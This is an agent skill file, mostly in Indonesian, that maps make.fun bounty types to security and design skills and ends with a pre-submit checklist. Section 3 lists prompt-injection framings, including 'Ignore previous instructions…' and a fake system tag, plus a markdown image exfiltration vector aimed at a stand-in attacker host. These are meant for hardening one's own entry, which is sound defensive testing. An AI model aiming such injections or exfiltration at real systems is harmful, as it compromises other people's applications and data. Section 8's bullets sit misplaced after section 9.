---
name: makefun-skill-map
description: Routing map for make.fun bounty work — which installed skill to load for each bounty type, with concrete steps. Use at the START of any make.fun entry build: read the bounty type, load only the skills listed for it, run the pre-submit checklist before submitting. Covers game/web, web app, forecast/program (pure stdlib Python), AI/LLM, token/contract, and image bounties. Does NOT replace the make.fun skill doc (https://make.fun/skill.md) or the bounty-hunter standing rules — it sits on top of them.
---

# make.fun Skill Map — Optimasi Skill untuk make.fun

> Lapisan routing di atas 88 skill bug bounty Claude + skill lama.
> Dibuat 2026-11-16. TIDAK mengubah skill aslinya — ini peta pemakaian saja.
> Aturan berdiri yang tetap berlaku: akun @nonton saja (jangan sage, jangan akun
> baru); coding bounty HARUS pure stdlib (tanpa Pillow/numpy); tiap submit
> @nonton pakai repo fresh yang di-anchor ke keypair @nonton; simpan claim code
> ke `~/workspace/goals/make-fun-bounty-entries/hidden_files/bounty-hunter-claims.md`;
> JANGAN PERNAH claim hadiah tanpa izin user; skip bounty yang butuh fee / API
> key berbayar / uang asli.

---

## 0. Cara pakai peta ini (30 detik)

1. Tentukan **tipe bounty** dari tabel §1.
2. Load **hanya skill yang tercantum** untuk tipe itu (baca SKILL.md-nya).
   Jangan load semua 88 skill — buang waktu dan bikin bingung.
3. Kerjakan build, lalu jalankan **Pre-Submit Checklist §7** sebelum `makefun submit`.
4. Kalau entry menyentuh kontrak/token → tambah langkah audit §5.
   Kalau entry punya auth/API/input user → tambah self-review §6.

---

## 1. Tipe bounty → skill

| Tipe bounty | Skill yang di-load | Kenapa |
|---|---|---|
| **Game 3D / web** (threejs-fps, best-game) | `frontend-design` | Desain visual + proses 2-pass (rencana → review → build → kritik). Satu elemen memorable, sisanya disiplin. |
| **Web app / frontend** (makefun-frontend-01, aggregator) | `frontend-design` + `hunt-llm-ai` (kalau ada fitur AI/chat) + `web2-recon` (§4, evaluasi kompetitor) | UI yang tidak terlihat template = nilai juri. AI feature → keraskan dari injection (§3). |
| **Forecast / program Python stdlib** (btc-cent, polymarket forecast) | `triage-validation` (§7, gate adaptasi) — TIDAK perlu skill lain | Entry offline murni: yang menang adalah kebenaran + test, bukan keamanan. Jangan buang waktu load skill audit. |
| **AI / LLM** (free-model-aggregator, chatbot, RAG) | `hunt-llm-ai` + `hunt-rag-vector` (hanya kalau ada RAG/vector DB) + `frontend-design` (kalau ada UI) | Keraskan entry dari prompt injection; uji reproduksibilitas jawaban (run-twice). |
| **Token / kontrak** (token-radar, coin-promo, mint) | `meme-coin-audit` + `web3-grep-arsenal` + `web3-bug-classes` + `web3-poc-foundry` (§5) | Audit kontrak entry sendiri sebelum submit; cek otoritas & fee. |
| **Gambar** (ai-excited, coolest-art) | `frontend-design` (prinsip visual) | Komposisi, tipografi, hindari ciri template AI. |
| **Parser / byte-exact** (markdown-render-speed) | `triage-validation` (§7) — TIDAK perlu skill lain | Yang menang: kepatuhan byte-per-byte + test harness, bukan keamanan. |

Skill yang **TIDAK PERNAH** di-load buat make.fun: semua enterprise/red-team
(`m365-entra-attack`, `okta-attack`, `vmware-vcenter-attack`,
`enterprise-vpn-attack`, `cloud-iam-deep`, `hunt-k8s`, `hunt-cicd`,
`hunt-sharepoint`, `hunt-ntlm-info`, `apk/ios-redteam-pipeline`,
`supply-chain-attack-recon`, `redteam-mindset`, `mid-engagement-ir-detection`),
`web3-hunt-zksync-era` (laporan hunt, bukan metode), `web3-ai-tools`
(tools pentest otonom butuh API key + target sistem orang — bukan buat build),
dan `web3-start-here` (cuma indeks navigasi — pakai sebagai penunjuk, bukan isi).

---

## 2. Game 3D / web app — pakai `frontend-design`

Langkah konkret (dari skill, dipadatkan):

1. **Rencana desain dulu (sebelum tulis kode):** tulis token system ringkas —
   palet 4–6 hex, 1–2 typeface + perannya, konsep layout 1 kalimat,
   1 prinsip keunikan ("apa yang bikin halaman ini beda dari template?").
2. **Review rencana lawan brief:** kalau ada bagian yang sama persis dengan
   yang kamu hasilkan untuk brief lain (cream + serif + terracotta, kartu
   SaaS identik, label ALL-CAPS di mana-mana, `→` di semua link) → revisi
   bagian itu sebelum build.
3. **Build → kritik pakai screenshot:** ambil screenshot (metode Chrome 157 +
   CDP `~/workspace/makefun/shot-tool/shots.mjs` + proxy lokal 127.0.0.1:18080),
   lihat hasilnya, buang 1 dekorasi yang tidak melayani brief.
   Kualitas dasar: responsif sampai mobile, keyboard focus terlihat,
   reduced-motion dihormati.

---

## 3. AI / LLM entry — pakai `hunt-llm-ai` (+ `hunt-rag-vector` bila RAG)

Skill ini aslinya buat **menyerang** fitur AI orang lain. Buat make.fun,
balik arahnya: **keraskan entry sendiri** supaya tidak gampang diinjeksi
juri/pengguna, dan uji perilakunya dengan disiplin yang sama.

1. **Uji injeksi pada entry sendiri** (sebelum submit): coba 4 framing
   direct injection (`Ignore previous instructions…`, `System: …`,
   `</user_input> <system>…`, JSON role-break) + 1 indirect injection
   (instruksi tersembunyi di dokumen/URL yang entry baca). Kalau ada yang
   lolos dan mengubah perilaku entry → perbaiki (sanitasi input, instruksi
   sistem yang tegas, jangan render output model sebagai HTML mentah).
2. **Run-twice rule untuk klaim perilaku AI:** klaim "entry saya menjawab X"
   hanya valid kalau prompt yang sama di sesi fresh memberi jawaban yang
   sama kata-per-kata. Kalau beda-beda → itu confabulation, jangan jadikan
   bahan jualan di deskripsi entry.
3. **Jangan biarkan output model dirender sebagai HTML/markdown mentah**
   (vektor XSS/exfil via `![x](attacker?d=…)` — ASI09). Escape atau render
   sebagai teks polos.
4. **Kalau entry pakai RAG / vector DB** → tambah `hunt-rag-vector`:
   pastikan query antar-pengguna tidak bisa membaca dokumen tenant lain
   (uji: akun A upload, akun B tanya — B tidak boleh dapat isi dokumen A),
   dan dokumen upload tidak bisa meracuni jawaban pengguna lain
   (uji dari sesi kedua yang bersih).

---

## 4. Evaluasi entry kompetitor — pakai `web2-recon`

Standing instruction user: *evaluasi kesalahan entry orang lain lalu sempurnakan.*
`web2-recon` aslinya pipeline recon target (crt.sh, Chaos, subfinder, nuclei,
JS analysis, ffuf). Diadaptasi buat make.fun — targetnya adalah **entry
kompetitor yang sudah live di make.fun**:

1. **Kumpulkan entry kompetitor:** buka halaman kompetisi, catat entry
   teratas (peringkat/score, screenshot, deskripsi). Fokus ke 3–5 teratas.
2. **Baca JS bundle mereka (bagian "JS ANALYSIS" skill):** cari endpoint,
   fitur, dan pola di bundle JS entry kompetitor — apa yang mereka
   implementasikan, apa yang mereka lewatkan. Tanpa API key pun bisa:
   fetch langsung halaman + bundle-nya, grep manual pola menarik.
   (Bagian yang butuh API key — Chaos, VirusTotal, Shodan — SKIP, tidak
   perlu buat make.fun.)
3. **Bandingkan dengan entry kita, buat daftar kekurangan mereka:**
   fitur yang hilang, bug yang terlihat, UX yang lemah, performa.
   Tiap kekurangan kompetitor = 1 perbaikan konkret di entry kita.
4. **Jangan tiru mentah-mentah:** ambil pelajarannya, bukan kodenya.
   Distinct-entrant check make.fun menggabungkan entry dengan kode
   byte-identical — meniru = kalah.

---

## 5. Audit kontrak / token entry — pakai `web3-*` + `meme-coin-audit`

Hanya untuk entry yang menyentuh smart contract / token
(token-radar, coin-promo, mint, DeFi). Entry tanpa kontrak → SKIP bagian ini.

### 5a. Fast sweep 5 menit (dari `meme-coin-audit` + `web3-grep-arsenal`)

Jalankan 8 grep kelas token di `src/` (mint tersembunyi, honeypot/blacklist,
manipulasi fee, drain LP, bonding curve, otoritas Solana, renounce palsu,
sandwich) + 10 blok grep `web3-grep-arsenal` (access control, reentrancy,
oracle, aritmatika, validasi input, token handling, dst). Kumpulkan hasil,
beri tier (Tier 1 = dekat privileged code / external call / state change
tanpa guard → selidiki dulu).

### 5b. Pola yang WAJIB dicek di kontrak entry sendiri

(dari `web3-bug-classes` + `web3-hunt-foundation` + case study role-misconfig)

- **Sibling modifier:** kalau `vote()` punya `onlyRole`, cek `poke()` /
  `reset()` / `harvest()` — modifier yang hilang di sibling = bug
  (19% temuan Critical).
- **Otoritas yang tertahan:** mint/freeze/update authority harus null
  setelah launch (Solana) atau `renounceOwnership` tidak di-override (EVM).
  "Otoritas yang tertahan ADALAH vektor rug."
- **Role yang tidak pernah di-grant:** kalau ada role tapi tidak ada
  `grantRole` untuk role itu di deploy script → fungsi terkait mati
  permanen (pola dari case study role-misconfig).
- **CEI (Checks-Effects-Interactions):** state update DULU, external call
  belakangan. `.call{value:}` / `safeTransfer` sebelum state update = Tier 1.
- **Oracle:** jangan pakai `slot0()` / `getReserves()` sebagai harga
  (flash-loan manipulable); Chainlink `latestRoundData` harus cek `updatedAt`.
- **10 pertanyaan penyerang** (`web3-hunt-foundation`): amount=0? panggil
  2x di blok sama? sebelum `initialize()`? front-run? external call gagal?
  fee-on-transfer? address(0)? `type(uint256).max`? flash loan? sibling
  tanpa modifier? — jalankan ke tiap fungsi external kontrak entry.

### 5c. Buktikan dengan Foundry (dari `web3-poc-foundry`)

Jangan percaya grep saja. Tulis test Foundry yang membuktikan perilaku
kontrak entry benar: mint bekerja, tidak ada hidden mint (totalSupply tidak
naik dari panggilan owner), jual tidak diblokir (bukan honeypot), fee tidak
bisa diubah ke 99%. Pakai cheatcode (`vm.prank`, `vm.expectRevert`,
`vm.createSelectFork` untuk fork mainnet bila perlu). Test hijau = bukti,
bukan klaim.

### 5d. Kalau ada budget waktu: scan otomatis

`web3-solidity-audit-mcp` (Slither + Aderyn + SWC via MCP): `analyze_contract`
dulu (full pipeline), lalu `check_vulnerabilities`, lalu
`generate_invariants` untuk invariant test. Catatan: butuh install manual
Foundry + Aderyn (jangan pipe installer ke bash), dan mode SAAS/remote sudah
dihapus dari adaptasi Muse — pakai lokal saja. `optimize_gas` berguna karena
gas entry ikut dinilai. Kalau MCP belum terpasang, 5a–5c sudah cukup.

---

## 6. Self-review kode entry — kapan pakai `hunt-*` web, kapan TIDAK

`hunt-*` web (xss, sqli, ssrf, idor, auth-bypass, jwt, oauth, csrf, cors,
dom, race-condition, business-logic, file-upload, graphql, websocket,
api-misconfig, dsb) aslinya buat menyerang aplikasi web orang lain.
Buat make.fun, satu-satunya pemakaian: **self-review kode entry sendiri**.

**PAKAI (§6a) kalau entry punya salah satu ini:**
- auth / login / session / JWT / OAuth
- API backend / fetch ke server sendiri
- input user yang disimpan / dirender (komentar, profil, upload file)
- pembayaran / transfer / peran (admin vs user)

**TIDAK PERLU kalau:**
- game statis / halaman statis / parser offline (markdown, forecast stdlib)
- tidak ada backend, tidak ada auth, tidak ada input user yang persisten

### 6a. Self-review cepat (15 menit, hanya untuk entry yang masuk kriteria)

1. Pilih 3–5 playbook yang relevan dengan fitur entry
   (misal entry ada login → `hunt-auth-bypass`, `hunt-jwt-crypto`,
   `hunt-session`; ada upload → `hunt-file-upload`; ada API → `hunt-idor`,
   `hunt-api-misconfig`).
2. Untuk tiap playbook, jalankan **satu** uji konkret pada entry sendiri
   (bukan teori): misal IDOR — minta data user B dari sesi user A;
   auth-bypass — panggil endpoint admin tanpa login dengan body well-formed
   `{}` (pelajaran `triage-validation`: body malformed memberi 400 dari
   sanitiser, BUKAN bukti lolos auth — selalu uji dengan body valid).
3. Temuan = perbaiki sebelum submit. Bukan temuan = lanjut.
   **5-minute rule:** kalau 5 menit tidak ada jalur serangan jelas di satu
   fungsi → berhenti, pindah ke fungsi berikut.

---

## 7. Pre-Submit Checklist (adaptasi `triage-validation` 7Q Gate)

Jalankan untuk SETIAP entry sebelum `makefun submit`. Satu jawaban
salah = perbaiki dulu, jangan submit.

**Gate 0 — Realita (30 detik)**
- [ ] Entry BENAR-BENAR jalan — dites langsung, bukan cuma dibaca kodenya
- [ ] Sesuai spek kompetisi — baca ulang reqs, tiap poin terpenuhi
- [ ] Bisa direproduksi dari fresh clone/repo — bukan cuma jalan di mesin dev
- [ ] Bukti siap — screenshot bagus, hasil test tercatat

**Gate 1 — Dampak / nilai (2 menit)**
- [ ] Bisa jawab: "apa yang entry ini LAKUKAN yang kompetitor tidak?"
- [ ] Jawaban lebih dari "kelihatan bagus" — ada fitur/performa/akurasi nyata
- [ ] Bukan mengandalkan juri melakukan sesuatu yang tidak mungkin

**Gate 2 — Duplikasi (5 menit)**
- [ ] Bukan kode byte-identical dengan entry lain (cek distinct-entrant:
  akun, wallet, GitHub login, repo owner, kode)
- [ ] Bukan submit ulang ke kompetisi yang sudah dimasuki (kecuali sengaja
  menggantikan entry lama via Force_Last)
- [ ] Baca 3–5 entry teratas (§4) — entry kita beda dan lebih baik di
  minimal 1 hal konkret

**Gate 3 — Kualitas submit (10 menit)**
- [ ] Judul/deskripsi: jelas, tanpa klaim "could potentially / mungkin"
- [ ] Test lolos: semua test harness hijau (atau alasan tercatat)
- [ ] Screenshot / demo menunjukkan fitur utama, bukan halaman kosong
- [ ] Kalau ada kontrak: §5 selesai, tidak ada Tier 1 yang terbuka
- [ ] Kalau ada AI: §3 selesai, injeksi dasar sudah diuji

**Kill-fast (dari `triage-validation`):** kalau 30+ menit stuck di satu
masalah tanpa bukti jalan keluar → catat, pindah ke bounty lain.
Jangan submit entry yang belum lolos Gate 0.

---

## 8. Catatan batasan

## 9. ATM news-image — Amati, Tiru, Modifikasi (2026-11-18)

Analisis lengkap: `~/workspace/goals/make-fun-bounty-entries/hidden_files/news-image-atm-2026-11-18.md`.
Gambar bukti: `~/workspace/makefun/atm/` (top 5 hari ini + top 3 kemarin + entry kita).

**Fakta:** entry kita 17 Nov cuma 95,42% (6 cerita) vs garis hadiah ~98%.
Semua pemenang menyembunyikan source code — yang ditiru adalah **gambarnya**,
diambil dari `/api/submissions/{id}/artifact.webp` (publik).

**Formula pemenang (konsisten 5 gambar top, 2 hari):**
- **28–35 cerita** per gambar, bukan 6.
- **2–3 visual lead besar**: ilustrasi vektor datar sederhana digambar pakai
  kode (jembatan, tanker, bendera) — bukan foto.
- **Peta dunia bernomor**, pin cocok dengan nomor cerita.
- **Struktur berlapis**: masthead (jumlah cerita + tanggal) → visual lead →
  grid featured 6–15 cerita + tag region → daftar bernomor "rest of the day"
  → peta + footer sumber.
- **Satu cerita per benua** di strip tengah (Europe / Middle East / Asia /
  Africa / Americas / Oceania).
- **Footer verifiabilitas**: "Every story happened or was first reported on
  [tanggal]", "Disputed claims are attributed", sumber: AP, Reuters, AFP,
  BBC, Al Jazeera, CNN.
- **Tidak ada ruang mati** — isi sampai bawah dengan daftar singkat.

**Resep entry berikutnya:** 30–35 cerita terverifikasi, ilustrasi vektor
untuk lead, peta bernomor, lapisan di atas, footer sumber + kalimat
verifiabilitas. Tetap 1024x1024, ≤1 MiB, deterministik, tanpa network,
stdlib saja.

**Arahan user 2026-11-18 ~08:07 WIB (berlaku umum buat make.fun, bukan cuma
news-image):** jangan buru-buru submit — research dulu sedalam-dalamnya,
pecahkan pola pemenang (bandingkan top 1–50 + yang kalah, pahami apa yang
juri pilih), maksimalkan entry sampai bisa salip leaderboard, baru submit.
Tujuannya USDC, jadi kualitas di atas kecepatan.

- Skill di sini adalah **playbook keamanan** — mereka mengajari cara
  menguji/merusak, bukan cara membangun. Nilai buat make.fun datang dari
  membalik arahnya (uji entry sendiri, keraskan, bandingkan dengan kompetitor).
- `web3-methodology-research` (ToB/SlowMist/ConsenSys) berguna sebagai
  referensi pola (CEI, tx.origin, rounding) saat MENULIS kontrak entry —
  baca bagian pola-nya saja, jangan kejar roadmap belajar 4 fasenya.
- `web3-triage-report` bagian Part 2 (template laporan Immunefi) TIDAK
  dipakai buat make.fun — yang dipakai hanya 7Q Gate + severity matrix
  (sudah diadaptasi di §7).
- Kalau ragu skill mana yang relevan: default-nya `frontend-design` +
  checklist §7. Itu saja sudah menutupi sebagian besar bounty.

---

<!-- Dibuat 2026-11-16 oleh subagent optimasi skill make.fun. Sumber: skim isi
inti 16 skill yang langsung nyambung + frontend-design (total ~8.286 baris,
skim struktur + bagian inti; file besar dibaca via header). Tidak ada skill
asli yang diubah. -->
